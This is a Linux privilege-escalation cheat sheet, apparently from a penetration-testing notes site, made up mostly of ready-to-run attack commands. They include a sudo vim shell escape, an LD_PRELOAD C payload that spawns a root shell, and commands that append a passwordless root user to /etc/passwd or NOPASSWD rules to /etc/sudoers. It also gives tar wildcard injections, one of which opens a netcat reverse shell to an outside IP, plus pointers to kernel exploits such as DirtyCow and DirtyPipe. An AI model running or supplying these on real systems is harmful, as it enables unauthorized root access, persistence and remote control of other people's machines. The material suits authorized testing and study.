# Linux/Unix

## Enumerate Users

```bash
whoami
id
cat /etc/passwd
```

## Services/Processes Running

```
ps aux
ps aux | grep root
```

## SUDO

Tool: [Sudo Exploitation](https://github.com/TH3xACE/SUDO\_KILLER)

#### NOPASSWD

Sudo configuration might allow a user to execute some command with another user's privileges without knowing the password.

```bash
$ sudo -l

User demo may run the following commands on crashlab:
    (root) NOPASSWD: /usr/bin/vim
```

In this example the user `demo` can run `vim` as `root`, it is now trivial to get a shell by adding an ssh key into the root directory or by calling `sh`.

```bash
sudo vim -c '!sh'
sudo -u root vim -c '!sh'
```

#### LD\_PRELOAD and NOPASSWD

If `LD_PRELOAD` is explicitly defined in the sudoers file

```bash
Defaults        env_keep += LD_PRELOAD
```

Compile the following shared object using the C code below with `gcc -fPIC -shared -o shell.so shell.c -nostartfiles`

```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>
#include <unistd.h>
void _init() {
	unsetenv("LD_PRELOAD");
	setgid(0);
	setuid(0);
	system("/bin/sh");
}
```

Execute any binary with the LD\_PRELOAD to spawn a shell : `sudo LD_PRELOAD=<full_path_to_so_file> <program>`, e.g: `sudo LD_PRELOAD=/tmp/shell.so find`

## GTFOBins

[GTFOBins](https://gtfobins.github.io/) is a curated list of Unix binaries that can be exploited by an attacker to bypass local security restrictions.

The project collects legitimate functions of Unix binaries that can be abused to break out restricted shells, escalate or maintain elevated privileges, transfer files, spawn bind and reverse shells, and facilitate the other post-exploitation tasks.

## Writable files

List world writable files on the system.

```bash
find / -writable ! -user `whoami` -type f ! -path "/proc/*" ! -path "/sys/*" -exec ls -al {} \; 2>/dev/null
find / -perm -2 -type f 2>/dev/null
find / ! -path "*/proc/*" -perm -2 -type f -print 2>/dev/null
```

### Writable /etc/passwd

First generate a password with one of the following commands.

```bash
openssl passwd -1 -salt hacker hacker
mkpasswd -m SHA-512 hacker
python2 -c 'import crypt; print crypt.crypt("hacker", "$6$salt")'
```

Then add the user `hacker` and add the generated password.

```bash
hacker:GENERATED_PASSWORD_HERE:0:0:Hacker:/root:/bin/bash
```

E.g: `hacker:$1$hacker$TzyKlv0/R/c28R.GAeLw.1:0:0:Hacker:/root:/bin/bash`

You can now use the `su` command with `hacker:hacker`

Alternatively you can use the following lines to add a dummy user without a password.\
WARNING: you might degrade the current security of the machine.

```bash
echo 'dummy::0:0::/root:/bin/bash' >>/etc/passwd
su - dummy
```

NOTE: In BSD platforms `/etc/passwd` is located at `/etc/pwd.db` and `/etc/master.passwd`, also the `/etc/shadow` is renamed to `/etc/spwd.db`.

### Writable /etc/sudoers

```bash
echo "username ALL=(ALL:ALL) ALL">>/etc/sudoers

# use SUDO without password
echo "username ALL=(ALL) NOPASSWD: ALL" >>/etc/sudoers
echo "username ALL=NOPASSWD: /bin/bash" >>/etc/sudoers
```

## Tar Wildcard

#### **Tar Wildcard Injection (1st method)**

```bash
echo "mkfifo /tmp/lhennp; nc 192.168.45.5 443 0</tmp/lhennp | /bin/sh >/tmp/lhennp 2>&1; rm /tmp/lhennp" > shell.sh
echo "" > "--checkpoint-action=exec=sh shell.sh"
echo "" > --checkpoint=1
tar cf archive.tar * 
```

#### **Tar Wildcard Injection (2st method)**

```bash
echo 'echo "ignite ALL=(root) NOPASSWD: ALL" > /etc/sudoers' > demo.sh
echo "" > "--checkpoint-action=exec=sh demo.sh"
echo "" > --checkpoint=1
tar cf archive.tar *

sudo -l
sudo bash
whoami
```

#### Tar Wildcard Injection (3rd method)

```bash
echo "chmod u+s /usr/bin/find" > test.sh
echo "" > "--checkpoint-action=exec=sh test.sh"
echo "" > --checkpoint=1
tar cf archive.tar *
ls -al /usr/bin/find
find f1 -exec "whoami" \;
root
find f1 -exec "/bin/sh" \;
id
whoami
```

#### Resources

{% embed url="https://www.hackingarticles.in/exploiting-wildcard-for-privilege-escalation/" %}

## Kernel Exploits

The following exploits are known to work well, search for more exploits with `searchsploit -w linux kernel centos`.

Another way to find a kernel exploit is to get the specific kernel version and linux distro of the machine by doing

```
uname -a
cat /etc/issue
cat /etc/*-release
cat /proc/version
lscpu
```

Copy the kernel version and distribution, and search for it in google or in [https://www.exploit-db.com/](https://www.exploit-db.com/).

#### CVE-2022-0847 (DirtyPipe)

Linux Privilege Escalation - Linux Kernel 5.8 < 5.16.11

```bash
https://www.exploit-db.com/exploits/50808
```

#### CVE-2016-5195 (DirtyCow)

Linux Privilege Escalation - Linux Kernel <= 3.19.0-73.8

```bash
# make dirtycow stable
echo 0 > /proc/sys/vm/dirty_writeback_centisecs
g++ -Wall -pedantic -O2 -std=c++11 -pthread -o dcow 40847.cpp -lutil
https://github.com/dirtycow/dirtycow.github.io/wiki/PoCs
https://github.com/evait-security/ClickNRoot/blob/master/1/exploit.c
```

#### CVE-2010-3904 (RDS)

Linux RDS Exploit - Linux Kernel <= 2.6.36-rc8

```
https://www.exploit-db.com/exploits/15285/
```

#### CVE-2010-4258 (Full Nelson)

Linux Kernel 2.6.37 (RedHat / Ubuntu 10.04)

```
https://www.exploit-db.com/exploits/15704/
```

#### CVE-2012-0056 (Mempodipper)

Linux Kernel 2.6.39 < 3.2.2 (Gentoo / Ubuntu x86/x64)

```bash
https://www.exploit-db.com/exploits/18411
```

##

## Automated Resources

{% embed url="https://github.com/rebootuser/LinEnum.git" %}

{% embed url="https://github.com/sleventyeleven/linuxprivchecker" %}

{% embed url="https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS" %}

